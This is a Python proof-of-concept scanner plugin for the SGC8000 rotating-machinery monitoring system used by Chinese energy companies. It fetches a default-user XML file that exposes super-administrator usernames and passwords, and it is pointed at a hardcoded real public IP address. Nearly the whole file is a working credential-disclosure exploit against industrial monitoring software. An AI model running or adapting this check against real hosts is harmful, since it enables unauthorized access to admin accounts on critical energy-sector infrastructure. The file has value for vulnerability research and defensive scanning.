#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  sgc8000 大型旋转机监控系统 系统超级管理员帐号密码泄漏（最高权限可进后台）
Author    :  a
mail      :  a@lcx.cc
 
refer     :  打雷 http://www.wooyun.org/bugs/wooyun-2015-0135197/
波及各大能源公司，包括中石油，中石化，中海油，中煤等等等等全国各个化工能源公司
"""
import urlparse

def assign(service, arg):
    if service == 'sgc8000':  
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    p ="app/sg8k_rs/config/defaultuser.xml"
    url = arg + p 
    code2, head, res, errcode, _ = curl.curl2(url )
    #print res ,code2
    if (code2 ==200) and ('username' in res) and ('<?xml version' in res) and ('password' in res):  
        security_warning(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('sgc8000', 'http://202.104.150.185/')[1])